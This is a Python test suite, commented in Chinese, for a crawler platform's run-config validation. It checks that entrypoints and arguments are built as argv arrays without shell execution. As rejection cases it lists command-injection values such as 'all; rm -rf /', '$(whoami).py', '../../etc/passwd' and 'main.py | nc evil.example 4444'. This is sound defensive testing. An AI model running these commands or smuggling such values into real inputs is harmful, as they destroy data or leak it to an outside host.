"""
结构化运行配置的校验、序列化与 argv 构建测试。

覆盖重点：
* 请求/响应体里不再出现命令字符串（防止被机房侧安全设备误判为恶意命令）；
* 入口文件与参数的边界校验；
* Worker 使用 argv 数组 + shell=False 执行。
"""

import json
import os
import sys

import pytest

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from app.core.run_config import (
    ARGS_MAX_COUNT,
    ARG_MAX_LEN,
    ENTRYPOINT_MAX_LEN,
    RunConfigError,
    build_exec_argv,
    build_subprocess_argv,
    deserialize_args,
    detect_family,
    flatten_entrypoint,
    normalize_run_config_input,
    normalize_run_config_update,
    resolve_stored_run_config,
    serialize_args,
    validate_args,
    validate_entrypoint,
)
from app.worker.executor import _resolve_task_run_config


# ── 入口文件校验 ────────────────────────────────────────────────────


def test_validate_entrypoint_normalizes_relative_path():
    assert validate_entrypoint("main.py") == "main.py"
    assert validate_entrypoint("./main.py") == "main.py"
    assert validate_entrypoint("spiders/test.py") == "spiders/test.py"
    assert validate_entrypoint("  main.py  ") == "main.py"


@pytest.mark.parametrize(
    "entrypoint",
    [
        "",
        "   ",
        "/etc/passwd",
        "C:\\Windows\\system32\\cmd.exe",
        "../main.py",
        "spiders/../../main.py",
        "python main.py",
        "main.py --mode all",
        "-c",
        "~/main.py",
        "$(whoami).py",
        "main",
        "a" * (ENTRYPOINT_MAX_LEN + 1) + ".py",
    ],
)
def test_validate_entrypoint_rejects_unsafe_values(entrypoint):
    with pytest.raises(RunConfigError):
        validate_entrypoint(entrypoint)


# ── 参数校验 ────────────────────────────────────────────────────────


def test_validate_args_preserves_order_and_inner_spaces():
    args = ["--mode", "all", "--keyword", "two words"]
    assert validate_args(args) == args
    assert validate_args(None) == []
    assert validate_args([]) == []


@pytest.mark.parametrize(
    "args",
    [
        "--mode",  # 字符串而非数组
        ["--mode", ""],
        ["--mode", "   "],
        ["--mode", 1],
        ["--mode", "a" * (ARG_MAX_LEN + 1)],
        ["--mode"] * (ARGS_MAX_COUNT + 1),
        ["--mode", "all; rm -rf /"],
        ["--mode", "all && ls"],
        ["--mode", "a|b"],
        ["--mode", "a`b`"],
        ["--mode", "a$(b)"],
        ["--mode", "line\nbreak"],
    ],
)
def test_validate_args_rejects_unsafe_values(args):
    with pytest.raises(RunConfigError):
        validate_args(args)


def test_url_style_args_are_allowed():
    """单个 & 属于合法查询串，只有 Shell 控制符号才被拒绝。"""
    args = ["--url", "https://example.com/search?q=a&page=2"]
    assert validate_args(args) == args


# ── 序列化 ──────────────────────────────────────────────────────────


def test_args_round_trip():
    raw = serialize_args(["--mode", "all"])
    assert json.loads(raw) == ["--mode", "all"]
    assert deserialize_args(raw) == ["--mode", "all"]
    assert deserialize_args(None) == []
    assert serialize_args([]) is None
    assert deserialize_args(["--mode"]) == ["--mode"]

    with pytest.raises(RunConfigError):
        deserialize_args('{"mode": "all"}')
    with pytest.raises(RunConfigError):
        deserialize_args("not-json")


# ── 运行时族与 argv 构建 ────────────────────────────────────────────


def test_detect_family_matches_runner_aliases():
    assert detect_family("python:3.11-slim") == "python"
    assert detect_family("py") == "python"
    assert detect_family("nodejs:18-slim") == "node"
    assert detect_family("node.js") == "node"
    assert detect_family("golang:1.21-alpine") == "go"
    assert detect_family("ruby") == "shell"
    assert detect_family(None) == "shell"


def test_build_exec_argv_per_runtime():
    assert build_exec_argv("python:3.11-slim", "main.py", ["--mode", "all"]) == [
        "python",
        "main.py",
        "--mode",
        "all",
    ]
    assert build_exec_argv("nodejs:18-slim", "index.js", []) == ["node", "index.js"]
    assert build_exec_argv("golang:1.21-alpine", "main.go", ["-v"]) == [
        "/app/spider_bin",
        "-v",
    ]
    assert build_exec_argv("ruby", "run.sh", []) == ["/bin/sh", "run.sh"]


def test_build_subprocess_argv_is_argv_array():
    argv = build_subprocess_argv("python:3.11-slim", "main.py", ["--mode", "all"])
    assert argv == ["python", "main.py", "--mode", "all"]
    assert isinstance(argv, list)
    # 参数中包含空格时也必须是独立 argv 元素，而不是拼接成命令串
    argv = build_subprocess_argv("python", "main.py", ["--keyword", "two words"])
    assert argv == ["python", "main.py", "--keyword", "two words"]
    assert all(isinstance(item, str) for item in argv)


def test_flatten_entrypoint():
    assert flatten_entrypoint("sub/main.py", "sub") == "main.py"
    assert flatten_entrypoint("sub/spiders/main.py", "sub") == "spiders/main.py"
    assert flatten_entrypoint("sub", "sub") == "."
    assert flatten_entrypoint("main.py", "sub") == "main.py"
    assert flatten_entrypoint("sub/main.py", None) == "sub/main.py"


# ── 写入路径 ────────────────────────────────────────────────────────


def test_normalize_run_config_input():
    assert normalize_run_config_input("main.py", ["--mode", "all"]) == (
        "main.py",
        ["--mode", "all"],
    )
    assert normalize_run_config_input("main.py", None) == ("main.py", [])
    assert normalize_run_config_input(None, None) == (None, [])

    with pytest.raises(RunConfigError):
        normalize_run_config_input("python main.py", None)
    with pytest.raises(RunConfigError):
        normalize_run_config_input("main.py", ["all; rm -rf /"])


def test_normalize_run_config_update_merges_partial_payload():
    # 仅提交 args：保留现有 entrypoint
    assert normalize_run_config_update(
        "main.py", '["--mode","all"]', {"args": ["--mode", "quick"]}
    ) == ("main.py", ["--mode", "quick"])

    # 仅提交 entrypoint：保留现有 args
    assert normalize_run_config_update(
        "main.py", '["--mode","all"]', {"entrypoint": "spiders/main.py"}
    ) == ("spiders/main.py", ["--mode", "all"])

    # 未提交运行配置：沿用当前值
    assert normalize_run_config_update(
        "main.py", '["--mode","all"]', {}
    ) == ("main.py", ["--mode", "all"])

    # 记录尚未配置：保持为空，不报错
    assert normalize_run_config_update(None, None, {}) == (None, [])

    # 记录中的配置非法且请求未提交运行配置：显式报错而不是猜测
    with pytest.raises(RunConfigError):
        normalize_run_config_update("", '{"bad": 1}', {})


# ── 读取路径 ────────────────────────────────────────────────────────


def test_resolve_stored_run_config_reads_structured_columns():
    resolution = resolve_stored_run_config("main.py", '["--mode","all"]')
    assert resolution.status == "ok"
    assert resolution.entrypoint == "main.py"
    assert resolution.args == ["--mode", "all"]
    assert resolution.is_runnable


def test_resolve_stored_run_config_flags_invalid_stored_value():
    resolution = resolve_stored_run_config("main.py; rm -rf /", None)
    assert resolution.status == "unparsed"
    assert resolution.entrypoint is None
    assert not resolution.is_runnable

    resolution = resolve_stored_run_config("main.py", "not-json")
    assert resolution.status == "unparsed"
    assert not resolution.is_runnable


def test_resolve_stored_run_config_empty_record():
    resolution = resolve_stored_run_config(None, None)
    assert resolution.status == "empty"
    assert not resolution.is_runnable


# ── Worker 侧 ───────────────────────────────────────────────────────


def test_worker_accepts_structured_payload():
    assert _resolve_task_run_config(
        {"task_id": "t1", "entrypoint": "main.py", "args": ["--mode", "all"]}
    ) == ("main.py", ["--mode", "all"])
    assert _resolve_task_run_config({"task_id": "t1", "entrypoint": "main.py"}) == (
        "main.py",
        [],
    )


def test_worker_rejects_payload_without_entrypoint():
    with pytest.raises(RunConfigError):
        _resolve_task_run_config({"task_id": "t1"})
    with pytest.raises(RunConfigError):
        _resolve_task_run_config({"task_id": "t1", "entrypoint": ""})


def test_worker_rejects_unsafe_payload():
    with pytest.raises(RunConfigError):
        _resolve_task_run_config(
            {"task_id": "t1", "entrypoint": "main.py", "args": ["all; rm -rf /"]}
        )
    with pytest.raises(RunConfigError):
        _resolve_task_run_config({"task_id": "t1", "entrypoint": "../../etc/passwd"})


# ── 线上报文不再包含命令字符串 ──────────────────────────────────────


def test_spider_schemas_only_expose_structured_run_config():
    from app.api.spiders.schemas import SpiderCreate, SpiderOut, SpiderTaskOut

    payload = SpiderCreate(
        name="demo",
        project_id="p1",
        source_type="MINIO",
        source_url="spiders/x.zip",
        language="python:3.11-slim",
        entrypoint="main.py",
        args=["--mode", "all"],
    )
    dumped = payload.model_dump()
    assert dumped["entrypoint"] == "main.py"
    assert dumped["args"] == ["--mode", "all"]
    assert "command" not in dumped

    spider_out = SpiderOut.model_validate(
        {
            "id": 1,
            "name": "demo",
            "description": None,
            "project_id": "p1",
            "source_type": "MINIO",
            "source_url": "spiders/x.zip",
            "language": "python:3.11-slim",
            "entrypoint": "main.py",
            "args": '["--mode","all"]',
            "target_nodes": '["node-a"]',
            "owner_id": None,
            "created_at": "2026-01-01T00:00:00",
            "updated_at": "2026-01-01T00:00:00",
            "is_deleted": False,
        }
    )
    assert "command" not in spider_out.model_dump()
    assert spider_out.entrypoint == "main.py"
    assert spider_out.args == ["--mode", "all"]
    assert spider_out.run_config_status == "ok"
    assert spider_out.target_nodes == ["node-a"]

    task_out = SpiderTaskOut.model_validate(
        {
            "id": 2,
            "task_id": "task-1",
            "spider_id": 1,
            "spider_name": "demo",
            "status": "success",
            "node_id": None,
            "entrypoint": "main.py",
            "args": '["--mode","all"]',
            "error_detail": None,
            "created_at": "2026-01-01T00:00:00",
            "started_at": None,
            "finished_at": None,
            "is_deleted": False,
        }
    )
    assert "command" not in task_out.model_dump()
    assert task_out.entrypoint == "main.py"
    assert task_out.args == ["--mode", "all"]


def test_task_request_schema_uses_structured_run_config():
    from app.api.tasks.schemas import TaskRequest

    request = TaskRequest(
        task_id="t1", spider_id=1, entrypoint="main.py", args=["--mode", "all"]
    )
    dumped = request.model_dump()
    assert dumped["entrypoint"] == "main.py"
    assert dumped["args"] == ["--mode", "all"]
    assert "script_path" not in dumped

    # 运行配置可省略，此时使用爬虫已保存的配置
    TaskRequest(task_id="t2", spider_id=1)


def test_response_payload_never_contains_a_command_string():
    """回归护栏：任何 API 响应体都不得包含命令字符串或 command 字段。"""
    from app.api.spiders.models import Spider
    from app.api.spiders.schemas import SpiderOut
    from app.api.tasks.models import SpiderTask
    from app.api.tasks.schemas import TaskListResponse
    from app.core.schemas.api_response import ApiResponse

    spider = Spider(
        id=7,
        project_id="p1",
        name="demo",
        source_type="MINIO",
        source_url="spiders/x.zip",
        language="python:3.11-slim",
        entrypoint="main.py",
        args='["--mode", "all"]',
        target_nodes='["node-a"]',
    )
    spider_body = ApiResponse[SpiderOut].model_validate(
        {"code": 200, "data": spider, "message": "ok"}
    ).model_dump_json()
    assert "python main.py" not in spider_body
    assert "command" not in json.loads(spider_body)["data"]
    assert json.loads(spider_body)["data"]["entrypoint"] == "main.py"
    assert json.loads(spider_body)["data"]["args"] == ["--mode", "all"]

    task = SpiderTask(
        id=1,
        task_id="t1",
        spider_id=7,
        spider_name="demo",
        status="success",
        entrypoint="main.py",
        args='["--mode", "all"]',
    )
    task_body = TaskListResponse.model_validate(
        {"items": [task], "total": 1}
    ).model_dump_json()
    assert "python main.py" not in task_body
    assert "command" not in json.loads(task_body)["items"][0]
    assert json.loads(task_body)["items"][0]["entrypoint"] == "main.py"
    assert json.loads(task_body)["items"][0]["args"] == ["--mode", "all"]


def test_response_payload_ignores_unexpected_command_key():
    """防御性：即使上游字典里混入 command 键，也不会出现在响应体中。"""
    from app.api.spiders.schemas import SpiderOut

    out = SpiderOut.model_validate(
        {
            "id": 7,
            "name": "demo",
            "description": None,
            "project_id": "p1",
            "source_type": "MINIO",
            "source_url": "spiders/x.zip",
            "language": "python:3.11-slim",
            "entrypoint": "main.py",
            "args": '["--mode", "all"]',
            "command": "python main.py --mode all",
            "target_nodes": None,
            "owner_id": None,
            "created_at": "2026-01-01T00:00:00",
            "updated_at": "2026-01-01T00:00:00",
            "is_deleted": False,
        }
    )
    assert "command" not in out.model_dump()
    assert "python main.py --mode all" not in out.model_dump_json()


def test_invalid_stored_run_config_is_flagged_not_echoed():
    from app.api.spiders.models import Spider
    from app.api.spiders.schemas import SpiderOut

    spider = Spider(
        id=9,
        project_id="p1",
        name="broken",
        source_type="MINIO",
        source_url="spiders/z.zip",
        language="python:3.11-slim",
        entrypoint="main.py | nc evil.example 4444",
    )
    out = SpiderOut.model_validate(spider)
    assert out.run_config_status == "unparsed"
    assert out.entrypoint is None
    assert out.args == []


def test_spider_update_detects_only_submitted_run_config_fields():
    """更新请求必须区分「未提交」与「提交了空值」，避免误清空运行配置。"""
    from app.api.spiders.schemas import SpiderUpdate

    assert SpiderUpdate(name="only-name").model_fields_set == {"name"}
    assert "entrypoint" in SpiderUpdate(entrypoint="main.py").model_fields_set
    assert "args" in SpiderUpdate(args=["--mode"]).model_fields_set
